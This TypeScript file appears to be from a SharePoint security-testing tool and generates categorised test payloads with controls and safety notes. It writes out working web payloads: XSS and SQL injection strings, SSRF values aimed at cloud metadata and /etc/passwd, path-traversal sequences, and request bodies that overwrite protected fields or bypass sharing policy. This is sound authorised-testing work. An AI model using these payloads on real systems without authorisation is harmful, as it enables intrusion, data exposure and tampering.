import {
  ParamLocation,
  Payload,
  PayloadFamily,
  PayloadGenerationContext,
  TestClassification,
} from "./types";

/**
 * Payload generation.
 *
 * A generated payload is a test *hypothesis*, not a vulnerability. Every
 * family documents the sink that makes the test relevant, ships a benign
 * control request, and lists the response differences worth manual review.
 */

export interface PayloadFamilyInfo {
  family: PayloadFamily;
  title: string;
  suspectedSink: string;
  safety: string;
  defaultParameter: string;
  defaultLocation: ParamLocation;
}

export const PAYLOAD_FAMILIES: Record<PayloadFamily, PayloadFamilyInfo> = {
  idor: {
    family: "idor",
    title: "Broken access control / IDOR",
    suspectedSink: "Server-side lookup of a list/item/version/file by an identifier supplied by the client.",
    safety: "Read requests only by default. Do not delete or modify another user's object.",
    defaultParameter: "itemId",
    defaultLocation: "path",
  },
  "mass-assignment": {
    family: "mass-assignment",
    title: "Mass assignment / protected property overwrite",
    suspectedSink: "Model binding of the request body onto a SharePoint entity (SP.ListItem, SP.List, SP.File...).",
    safety: "Use a disposable item. Protected fields such as AuthorId or Created should not be client-writable.",
    defaultParameter: "body",
    defaultLocation: "body",
  },
  "odata-injection": {
    family: "odata-injection",
    title: "OData query manipulation",
    suspectedSink: "OData $filter/$select/$expand/$orderby/$top parsing and any downstream CAML translation.",
    safety: "Read-only. Large $top values should be bounded to avoid load on the tenant.",
    defaultParameter: "$filter",
    defaultLocation: "query",
  },
  xss: {
    family: "xss",
    title: "Stored / reflected cross-site scripting",
    suspectedSink: "Field values rendered in list views, forms, comments, view HTML, or page metadata.",
    safety: "Use a test item and test string. Verify encoding in the raw response before opening a browser.",
    defaultParameter: "Title",
    defaultLocation: "body",
  },
  sqli: {
    family: "sqli",
    title: "SQL injection (only where a sink plausibly exists)",
    suspectedSink: "Custom solutions, reports, or connectors that persist field values into SQL. SharePoint's own store is not a SQL sink.",
    safety: "Time-based payloads are deliberately short (<=5s). Do not run destructive stacked queries.",
    defaultParameter: "Title",
    defaultLocation: "body",
  },
  ssrf: {
    family: "ssrf",
    title: "Server-side request forgery",
    suspectedSink: "Server-side URL fetchers: sharing URL parameters, image/thumbnail URLs, move/copy resource paths, web part properties.",
    safety: "Use loopback/private targets only in an authorised tenant. No external callbacks.",
    defaultParameter: "url",
    defaultLocation: "body",
  },
  "path-traversal": {
    family: "path-traversal",
    title: "Path traversal / unsafe file handling",
    suspectedSink: "File and folder names, DecodedUrl parameters, attachment names, template paths.",
    safety: "Create files only in a disposable document library folder.",
    defaultParameter: "fileName",
    defaultLocation: "path",
  },
  "method-confusion": {
    family: "method-confusion",
    title: "Method confusion / verb tampering",
    suspectedSink: "Authorization enforced per verb, X-HTTP-Method override handling, or inconsistent routing.",
    safety: "Prefer HEAD/OPTIONS. Destructive verbs only against disposable objects.",
    defaultParameter: "method",
    defaultLocation: "header",
  },
  "business-logic": {
    family: "business-logic",
    title: "Business logic / workflow and state transitions",
    suspectedSink: "Moderation status, approval requests, versioning, sharing-link settings, expiration handling.",
    safety: "Use a disposable item and document the expected state transition before testing.",
    defaultParameter: "fields",
    defaultLocation: "body",
  },
  "input-validation": {
    family: "input-validation",
    title: "Input validation / boundary values",
    suspectedSink: "Type coercion, null handling, length limits, unicode normalisation, duplicate parameters.",
    safety: "Non-destructive values only unless the endpoint itself is destructive.",
    defaultParameter: "Title",
    defaultLocation: "body",
  },
  authz: {
    family: "authz",
    title: "Authorization boundary checks",
    suspectedSink: "Principal and role identifiers, permission inheritance, sharing scopes.",
    safety: "Compare responses between two authorised test accounts. Do not grant permissions to real users.",
    defaultParameter: "principalId",
    defaultLocation: "path",
  },
};

interface PayloadInput {
  family: PayloadFamily;
  slug: string;
  name: string;
  classification: TestClassification;
  location: ParamLocation;
  parameter: string;
  value: unknown;
  rationale: string;
  expectedObservations: string[];
  control?: boolean;
  destructive?: boolean;
}

function payload(input: PayloadInput): Payload {
  return {
    id: input.family + "." + input.slug,
    family: input.family,
    name: input.name,
    classification: input.classification,
    location: input.location,
    parameter: input.parameter,
    value: input.value,
    rationale: input.rationale,
    expectedObservations: input.expectedObservations,
    control: !!input.control,
    destructive: !!input.destructive,
  };
}

function info(family: PayloadFamily): PayloadFamilyInfo {
  return PAYLOAD_FAMILIES[family];
}

function parameterFor(ctx: PayloadGenerationContext, family: PayloadFamily): string {
  return ctx.parameter || info(family).defaultParameter;
}

function locationFor(ctx: PayloadGenerationContext, family: PayloadFamily): ParamLocation {
  return ctx.location || info(family).defaultLocation;
}

/**
 * Returns a bounded, ordered list of payloads for one family. The first entry
 * is always the benign control request.
 */
export function generatePayloads(
  family: PayloadFamily,
  context?: PayloadGenerationContext
): Payload[] {
  const ctx: PayloadGenerationContext = context || {};
  switch (family) {
    case "idor":
      return idorPayloads(ctx);
    case "mass-assignment":
      return massAssignmentPayloads(ctx);
    case "odata-injection":
      return odataPayloads(ctx);
    case "xss":
      return xssPayloads(ctx);
    case "sqli":
      return sqliPayloads(ctx);
    case "ssrf":
      return ssrfPayloads(ctx);
    case "path-traversal":
      return pathTraversalPayloads(ctx);
    case "method-confusion":
      return methodConfusionPayloads(ctx);
    case "business-logic":
      return businessLogicPayloads(ctx);
    case "input-validation":
      return inputValidationPayloads(ctx);
    case "authz":
      return authzPayloads(ctx);
    default:
      return [];
  }
}

function control(
  family: PayloadFamily,
  parameter: string,
  location: ParamLocation,
  value: unknown,
  note: string
): Payload {
  return payload({
    family: family,
    slug: "control",
    name: "Control (baseline) request",
    classification: "documented",
    location: location,
    parameter: parameter,
    value: value,
    rationale: note,
    expectedObservations: [
      "Use this response as the comparison baseline; it should be a normal 2xx response.",
    ],
    control: true,
  });
}

function idorPayloads(ctx: PayloadGenerationContext): Payload[] {
  const parameter = parameterFor(ctx, "idor");
  const location = locationFor(ctx, "idor");
  const baseline = ctx.baselineValue !== undefined ? ctx.baselineValue : 1;
  const result: Payload[] = [
    control("idor", parameter, location, baseline, "Baseline request for an object the current user may access."),
  ];
  const numericValues: Array<string | number> = [
    0,
    -1,
    1,
    2,
    2147483647,
    "01",
    " 1",
    "1e0",
    "+1",
    "1.5",
    "999999999999999999999",
  ];
  for (let i = 0; i < numericValues.length; i++) {
    result.push(
      payload({
        family: "idor",
        slug: "numeric-" + i,
        name: "Alternate numeric identifier: " + String(numericValues[i]),
        classification: i < 3 ? "controlled-probe" : "hypothesis",
        location: location,
        parameter: parameter,
        value: numericValues[i],
        rationale:
          "Checks whether identifier parsing or access checks differ for boundary and alternate numeric forms.",
        expectedObservations: [
          "200 for an object you are not allowed to see (compare with the baseline item and with a second account).",
          "Data for a different item than requested, or a different item's metadata surface.",
          "500/timeout instead of a clean 400/404, which may indicate a parsing defect worth investigating.",
        ],
      })
    );
  }
  const guidValues = [
    "00000000-0000-0000-0000-000000000000",
    "{00000000-0000-0000-0000-000000000000}",
    "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF",
    "00000000000000000000000000000000",
    "not-a-guid",
  ];
  for (let i = 0; i < guidValues.length; i++) {
    result.push(
      payload({
        family: "idor",
        slug: "guid-" + i,
        name: "Alternate GUID form: " + guidValues[i],
        classification: "controlled-probe",
        location: location,
        parameter: parameter,
        value: guidValues[i],
        rationale:
          "GUIDs have several accepted encodings (braces, compact, case). Inconsistent validation can map a rejected identifier to a different resource.",
        expectedObservations: [
          "A resource is returned for a GUID the user should not see.",
          "Braced/compact forms resolve when the canonical form is denied.",
        ],
      })
    );
  }
  return result;
}

function massAssignmentPayloads(ctx: PayloadGenerationContext): Payload[] {
  const parameter = parameterFor(ctx, "mass-assignment");
  const location = locationFor(ctx, "mass-assignment");
  const baseline = ctx.baselineValue !== undefined ? ctx.baselineValue : { Title: "Control title" };
  const properties: Array<{ name: string; slug: string; value: unknown; rationale: string }> = [
    { name: "Id", slug: "property-id", value: 1, rationale: "Server-generated primary key should not be assignable." },
    { name: "ID", slug: "property-id-uppercase", value: 1, rationale: "Alternative casing of the same protected identifier." },
    { name: "Created", slug: "property-created", value: "2000-01-01T00:00:00Z", rationale: "Audit timestamps should be server-controlled." },
    { name: "Modified", slug: "property-modified", value: "2099-01-01T00:00:00Z", rationale: "Future modification time can hide activity." },
    { name: "AuthorId", slug: "property-authorid", value: 1, rationale: "Author impersonation if the property is bound." },
    { name: "EditorId", slug: "property-editorid", value: 1, rationale: "Editor impersonation if the property is bound." },
    { name: "GUID", slug: "property-guid", value: "00000000-0000-0000-0000-000000000000", rationale: "Unique id collisions / object confusion." },
    { name: "ContentTypeId", slug: "property-contenttypeid", value: "0x0100", rationale: "Content type switching can change field validation." },
    { name: "FileSystemObjectType", slug: "property-filesystemobjecttype", value: 1, rationale: "Item/folder type confusion." },
    { name: "OData__UIVersionString", slug: "property-odata__uiversionstring", value: "999.0", rationale: "Version metadata tampering." },
    { name: "_ModerationStatus", slug: "property-_moderationstatus", value: 0, rationale: "Bypass moderation/approval workflow." },
    { name: "ComplianceAssetId", slug: "property-complianceassetid", value: "00000000-0000-0000-0000-000000000000", rationale: "Compliance metadata tampering." },
    { name: "ServerRelativeUrl", slug: "property-serverrelativeurl", value: "/sites/other/Shared Documents/x.txt", rationale: "Path/identity confusion." },
  ];
  const result: Payload[] = [
    control("mass-assignment", parameter, location, baseline, "Normal create/update body with documented fields only."),
  ];
  for (let i = 0; i < properties.length; i++) {
    const property = properties[i];
    const value: Record<string, unknown> = {};
    value[property.name] = property.value;
    if (baseline && typeof baseline === "object" && !(baseline instanceof Array)) {
      const keys = Object.keys(baseline as Record<string, unknown>);
      for (let k = 0; k < keys.length; k++) {
        if (keys[k] !== property.name) {
          value[keys[k]] = (baseline as Record<string, unknown>)[keys[k]];
        }
      }
    }
    result.push(
      payload({
        family: "mass-assignment",
        slug: property.slug,
        name: "Protected property: " + property.name,
        classification: "controlled-probe",
        location: location,
        parameter: parameter,
        value: value,
        rationale: property.rationale,
        expectedObservations: [
          "The response echoes the protected value, or a subsequent GET shows it persisted.",
          "A 400 naming the property is expected and is NOT a finding by itself.",
        ],
        destructive: true,
      })
    );
  }
  return result;
}

function odataPayloads(ctx: PayloadGenerationContext): Payload[] {
  const parameter = parameterFor(ctx, "odata-injection");
  const location = locationFor(ctx, "odata-injection");
  const baseline = ctx.baselineValue !== undefined ? ctx.baselineValue : "Id gt 0";
  const result: Payload[] = [
    control("odata-injection", parameter, location, baseline, "A valid, benign OData filter."),
  ];
  const filters: Array<{ value: string; note: string }> = [
    { value: "1 eq 1", note: "Tautology that should still be security trimmed." },
    { value: "Id gt 0 or 1 eq 1", note: "Boolean operator precedence." },
    { value: "Title eq 'x' or '' eq ''", note: "Quoted string tautology." },
    { value: "Title eq 'x'' or 1 eq 1--", note: "Quote escaping / comment syntax." },
    { value: "startswith(Title,'a')", note: "Documented function; check for unusual cost or errors." },
    { value: "substringof('a',Title)", note: "Legacy function that maps to CAML." },
    { value: "Author/Title eq 'x'", note: "Navigation property without $expand." },
    { value: "ID gt 0&$top=5000", note: "Parameter injection via filter value." },
    { value: "ID gt 0&$select=*", note: "Second query option injected through a value." },
    { value: "%27%20or%201%20eq%201--", note: "Pre-encoded injection form." },
  ];
  for (let i = 0; i < filters.length; i++) {
    result.push(
      payload({
        family: "odata-injection",
        slug: "filter-" + i,
        name: "Filter variation: " + filters[i].value,
        classification: i < 2 ? "controlled-probe" : "hypothesis",
        location: location,
        parameter: parameter,
        value: filters[i].value,
        rationale: filters[i].note,
        expectedObservations: [
          "Results include items excluded by the normal view or by the user's permissions.",
          "Different error text reveals the query parser or a CAML translation layer.",
          "Response time grows unexpectedly with a simple filter (possible unbounded query).",
        ],
      })
    );
  }
  const otherOptions: Array<{ param: string; value: string; note: string }> = [
    { param: "$select", value: "ID,Title,*", note: "Wildcard / unexpected projection." },
    { param: "$select", value: "ID,Title,Author/Title", note: "Navigation property in $select without $expand." },
    { param: "$select", value: "ID,Title&$top=5000", note: "Option injection inside $select." },
    { param: "$orderby", value: "ID desc,Title", note: "Multi-column ordering." },
    { param: "$orderby", value: "ID desc&$top=5000", note: "Option injection inside $orderby." },
    { param: "$top", value: "-1", note: "Negative page size." },
    { param: "$top", value: "5000", note: "Above the default page size; observe throttling." },
    { param: "$top", value: "2147483647", note: "Integer boundary." },
    { param: "$skiptoken", value: "Paged=TRUE&p_ID=1", note: "Valid paging token." },
    { param: "$skiptoken", value: "Paged=FALSE", note: "Contradictory paging state." },
    { param: "$skiptoken", value: "'", note: "Malformed token; look for parser errors." },
  ];
  for (let i = 0; i < otherOptions.length; i++) {
    const option = otherOptions[i];
    result.push(
      payload({
        family: "odata-injection",
        slug: "option-" + i,
        name: option.param + " variation: " + option.value,
        classification: "hypothesis",
        location: "query",
        parameter: option.param,
        value: option.value,
        rationale: option.note,
        expectedObservations: [
          "The option is silently ignored, reflected, or combined differently than documented.",
          "A 500 with a parser stack trace or CAML fragment.",
        ],
      })
    );
  }
  return result;
}

function xssPayloads(ctx: PayloadGenerationContext): Payload[] {
  const parameter = parameterFor(ctx, "xss");
  const location = locationFor(ctx, "xss");
  const baseline = ctx.baselineValue !== undefined ? ctx.baselineValue : "Control text";
  const result: Payload[] = [
    control("xss", parameter, location, baseline, "Plain text value used to compare encoding."),
  ];
  const values = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "<a href=\"https://example.invalid\" onclick=\"alert(1)\">x</a>",
  ];
  for (let i = 0; i < values.length; i++) {
    result.push(
      payload({
        family: "xss",
        slug: "value-" + i,
        name: "Markup payload " + (i + 1),
        classification: i < 2 ? "controlled-probe" : "hypothesis",
        location: location,
        parameter: parameter,
        value: values[i],
        rationale:
          "Stored field value is rendered by list views, forms, comments or FieldValuesAsHTML; check where the value reaches HTML without encoding.",
        expectedObservations: [
          "The exact payload appears unencoded in FieldValuesAsHTML / renderAsHtml / page HTML.",
          "The value is encoded in the API response but decoded somewhere else in the UI.",
          "A Content-Security-Policy blocks execution: note it, but encoding is still required.",
        ],
        destructive: true,
      })
    );
  }
  return result;
}

function sqliPayloads(ctx: PayloadGenerationContext): Payload[] {
  const parameter = parameterFor(ctx, "sqli");
  const location = locationFor(ctx, "sqli");
  const baseline = ctx.baselineValue !== undefined ? ctx.baselineValue : "Control text";
  const result: Payload[] = [
    control("sqli", parameter, location, baseline, "Plain text control for error/timing comparison."),
  ];
  const values = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' UNION SELECT NULL--",
    "\" OR \"\"=\"",
    "1' AND SLEEP(5)--",
    "1;WAITFOR DELAY '0:0:5'--",
    "') OR ('1'='1",
  ];
  for (let i = 0; i < values.length; i++) {
    result.push(
      payload({
        family: "sqli",
        slug: "value-" + i,
        name: "SQL payload " + (i + 1),
        classification: "hypothesis",
        location: location,
        parameter: parameter,
        value: values[i],
        rationale:
          "Only relevant if a custom component or report writes this field into SQL. SharePoint's own content store is not a SQL sink.",
        expectedObservations: [
          "A database error (syntax, ODBC, SQL Server) in the response.",
          "A reproducible 5 second delay for time-based payloads versus the control.",
          "Different result sets for tautology payloads in a custom search/report feature.",
        ],
        destructive: true,
      })
    );
  }
  return result;
}

function ssrfPayloads(ctx: PayloadGenerationContext): Payload[] {
  const parameter = parameterFor(ctx, "ssrf");
  const location = locationFor(ctx, "ssrf");
  const baseline = ctx.baselineValue !== undefined ? ctx.baselineValue : "https://contoso.sharepoint.com/sites/team";
  const result: Payload[] = [
    control("ssrf", parameter, location, baseline, "A normal in-tenant URL."),
  ];
  const values = [
    "http://127.0.0.1:9/",
    "http://localhost/",
    "http://[::1]/",
    "http://169.254.169.254/latest/meta-data/",
    "http://10.0.0.1/",
    "file:///etc/passwd",
    "\\\\localhost\\c$\\windows\\win.ini",
    "https://contoso.sharepoint.com@127.0.0.1/",
  ];
  for (let i = 0; i < values.length; i++) {
    result.push(
      payload({
        family: "ssrf",
        slug: "url-" + i,
        name: "Server-side fetch target " + (i + 1),
        classification: "hypothesis",
        location: location,
        parameter: parameter,
        value: values[i],
        rationale:
          "Relevant only where the service fetches a URL server-side (sharing, thumbnails, imports, web part metadata). The chosen targets are loopback/private or non-routable.",
        expectedObservations: [
          "A response that contains content or metadata from the target host.",
          "Timing differences between an open and a closed port on 127.0.0.1.",
          "A different error for 'connection refused' versus 'host not found' (blind SSRF signal).",
        ],
        destructive: true,
      })
    );
  }
  return result;
}

function pathTraversalPayloads(ctx: PayloadGenerationContext): Payload[] {
  const parameter = parameterFor(ctx, "path-traversal");
  const location = locationFor(ctx, "path-traversal");
  const baseline = ctx.baselineValue !== undefined ? ctx.baselineValue : "research.txt";
  const result: Payload[] = [
    control("path-traversal", parameter, location, baseline, "Normal file name in the disposable research folder."),
  ];
  const values = [
    "../research.txt",
    "..\\research.txt",
    "..%2fresearch.txt",
    "..%252fresearch.txt",
    "....//research.txt",
    "%2e%2e%2fresearch.txt",
    "%c0%ae%c0%ae%2fresearch.txt",
    "research.txt%00.png",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "\\\\?\\C:\\Windows\\win.ini",
    repeatString("../", 12) + "research.txt",
  ];
  for (let i = 0; i < values.length; i++) {
    result.push(
      payload({
        family: "path-traversal",
        slug: "value-" + i,
        name: "Path payload " + (i + 1),
        classification: "controlled-probe",
        location: location,
        parameter: parameter,
        value: values[i],
        rationale:
          "Checks whether DecodedUrl / file-name handling normalises traversal sequences before authorization or storage.",
        expectedObservations: [
          "A file is created or read outside the intended folder.",
          "The server returns content from a path outside the web (unlikely, but a clear signal).",
          "Different status codes for encoded versus plain traversal sequences.",
        ],
        destructive: true,
      })
    );
  }
  return result;
}

function methodConfusionPayloads(ctx: PayloadGenerationContext): Payload[] {
  const parameter = ctx.parameter || "method";
  const result: Payload[] = [
    control("method-confusion", parameter, "header", "GET", "Declared read method as the baseline."),
  ];
  const methods = ["HEAD", "OPTIONS", "POST", "PUT", "PATCH", "DELETE", "MERGE", "TRACE"];
  for (let i = 0; i < methods.length; i++) {
    result.push(
      payload({
        family: "method-confusion",
        slug: "method-" + methods[i].toLowerCase(),
        name: "Verb: " + methods[i],
        classification: "controlled-probe",
        location: "header",
        parameter: parameter,
        value: methods[i],
        rationale:
          "Checks whether authorization and routing agree on the verb, including legacy MERGE/X-HTTP-Method handling.",
        expectedObservations: [
          "A write succeeds through a verb the endpoint should not accept.",
          "405 vs 403 differences that reveal routing before authorization.",
          "POST + X-HTTP-Method: DELETE is accepted where DELETE is denied.",
        ],
        destructive: methods.indexOf("DELETE") >= 0 || methods.indexOf("MERGE") >= 0,
      })
    );
  }
  const overrides = ["DELETE", "PATCH", "MERGE", "PUT"];
  for (let i = 0; i < overrides.length; i++) {
    result.push(
      payload({
        family: "method-confusion",
        slug: "override-" + overrides[i].toLowerCase(),
        name: "X-HTTP-Method override: " + overrides[i],
        classification: "hypothesis",
        location: "header",
        parameter: "X-HTTP-Method",
        value: overrides[i],
        rationale:
          "SharePoint honours X-HTTP-Method on POST. Check that authorization is applied to the effective verb, not the outer POST.",
        expectedObservations: [
          "The override is executed even though the caller lacks the permission for that verb.",
          "Inconsistent results between POST+override and the direct verb.",
        ],
        destructive: true,
      })
    );
  }
  return result;
}

function businessLogicPayloads(ctx: PayloadGenerationContext): Payload[] {
  const parameter = parameterFor(ctx, "business-logic");
  const location = locationFor(ctx, "business-logic");
  const baseline = ctx.baselineValue !== undefined ? ctx.baselineValue : { Title: "Control title" };
  const result: Payload[] = [
    control("business-logic", parameter, location, baseline, "Normal field values matching the documented workflow."),
  ];
  const cases: Array<{ name: string; value: unknown; rationale: string }> = [
    { name: "Approve via moderation status", value: { _ModerationStatus: 0 }, rationale: "Sets Approved directly instead of using the approval workflow." },
    { name: "Reject via moderation status", value: { _ModerationStatus: 2 }, rationale: "Rejected state may bypass reviewer checks." },
    { name: "Draft state", value: { _ModerationStatus: 3 }, rationale: "Draft visibility and audience rules differ." },
    { name: "Author impersonation", value: { AuthorId: 1 }, rationale: "Audit trail integrity." },
    { name: "Backdated creation", value: { Created: "2000-01-01T00:00:00Z" }, rationale: "Retention / audit manipulation." },
    { name: "Future modification", value: { Modified: "2099-01-01T00:00:00Z" }, rationale: "Hides recent changes from time-based reviews." },
    { name: "Version string tampering", value: { OData__UIVersionString: "999.0" }, rationale: "Version checks used by workflow conditions." },
    { name: "Approval awaitAll disabled", value: { awaitAll: false }, rationale: "Single approval may complete a multi-approver request." },
    { name: "Share link to anonymous", value: { request: { createLink: true, settings: { linkKind: 4, role: 1, allowAnonymousAccess: true } } }, rationale: "Sharing policy bypass." },
    { name: "Expired share link", value: { request: { createLink: true, settings: { linkKind: 4, role: 1, expiration: "2000-01-01T00:00:00Z" } } }, rationale: "Expiration validation." },
  ];
  for (let i = 0; i < cases.length; i++) {
    result.push(
      payload({
        family: "business-logic",
        slug: "case-" + i,
        name: cases[i].name,
        classification: "hypothesis",
        location: location,
        parameter: parameter,
        value: cases[i].value,
        rationale: cases[i].rationale,
        expectedObservations: [
          "The state change succeeds without the documented workflow step.",
          "A subsequent GET shows the tampered state persisted.",
          "Different behaviour between roles indicates an authorization gap.",
        ],
        destructive: true,
      })
    );
  }
  return result;
}

function inputValidationPayloads(ctx: PayloadGenerationContext): Payload[] {
  const parameter = parameterFor(ctx, "input-validation");
  const location = locationFor(ctx, "input-validation");
  const baseline = ctx.baselineValue !== undefined ? ctx.baselineValue : "Control text";
  const result: Payload[] = [
    control("input-validation", parameter, location, baseline, "A valid value for the parameter."),
  ];
  const values: Array<{ value: unknown; name: string }> = [
    { value: null, name: "null" },
    { value: "", name: "empty string" },
    { value: " ", name: "whitespace only" },
    { value: [], name: "empty array" },
    { value: {}, name: "empty object" },
    { value: 0, name: "zero" },
    { value: -1, name: "negative number" },
    { value: true, name: "boolean instead of string" },
    { value: "1e309", name: "numeric overflow string" },
    { value: repeatString("A", 4096), name: "4KB string" },
    { value: repeatString("A", 32768), name: "32KB string" },
    { value: "\u0000", name: "null byte" },
    { value: "\u202e", name: "right-to-left override" },
    { value: "\uD800", name: "lone surrogate" },
    { value: "%00", name: "encoded null byte" },
    { value: "{{7*7}}", name: "template expression" },
    { value: "${7*7}", name: "template literal expression" },
  ];
  for (let i = 0; i < values.length; i++) {
    result.push(
      payload({
        family: "input-validation",
        slug: "value-" + i,
        name: "Boundary value: " + values[i].name,
        classification: "controlled-probe",
        location: location,
        parameter: parameter,
        value: values[i].value,
        rationale:
          "Boundary and type confusion values reveal unbounded input, coercion, and inconsistent validation across endpoints.",
        expectedObservations: [
          "500 with a stack trace or internal type name.",
          "The value is accepted and persisted when it should be rejected.",
          "Different validation between create, update, and validateUpdateListItem.",
        ],
        destructive: true,
      })
    );
  }
  return result;
}

function authzPayloads(ctx: PayloadGenerationContext): Payload[] {
  const parameter = parameterFor(ctx, "authz");
  const location = locationFor(ctx, "authz");
  const baseline = ctx.baselineValue !== undefined ? ctx.baselineValue : 1;
  const result: Payload[] = [
    control("authz", parameter, location, baseline, "Baseline principal known to the current user."),
  ];
  const values: Array<{ value: unknown; name: string }> = [
    { value: 0, name: "principal 0" },
    { value: 1, name: "principal 1" },
    { value: 1073741823, name: "everyone principal (1073741823)" },
    { value: 1073741822, name: "authenticated users principal (1073741822)" },
    { value: -1, name: "negative principal" },
    { value: 999999, name: "nonexistent principal" },
  ];
  for (let i = 0; i < values.length; i++) {
    result.push(
      payload({
        family: "authz",
        slug: "principal-" + i,
        name: "Principal variation: " + values[i].name,
        classification: "controlled-probe",
        location: location,
        parameter: parameter,
        value: values[i].value,
        rationale:
          "Checks whether special principals or invalid ids are resolved to an unexpected effective identity.",
        expectedObservations: [
          "A role assignment is created for a principal you should not be able to target.",
          "Permission masks change for another account.",
          "A different error for invalid vs forbidden principals.",
        ],
        destructive: true,
      })
    );
  }
  return result;
}

function repeatString(value: string, count: number): string {
  let out = "";
  for (let i = 0; i < count; i++) {
    out += value;
  }
  return out;
}

/** Produces a compact, deduplicated test-case list for an endpoint. */
export function generatePayloadsForFamilies(
  families: PayloadFamily[],
  context?: PayloadGenerationContext
): Payload[] {
  const out: Payload[] = [];
  const seen: Record<string, boolean> = {};
  for (let i = 0; i < families.length; i++) {
    const generated = generatePayloads(families[i], context);
    for (let j = 0; j < generated.length; j++) {
      if (!seen[generated[j].id]) {
        seen[generated[j].id] = true;
        out.push(generated[j]);
      }
    }
  }
  return out;
}
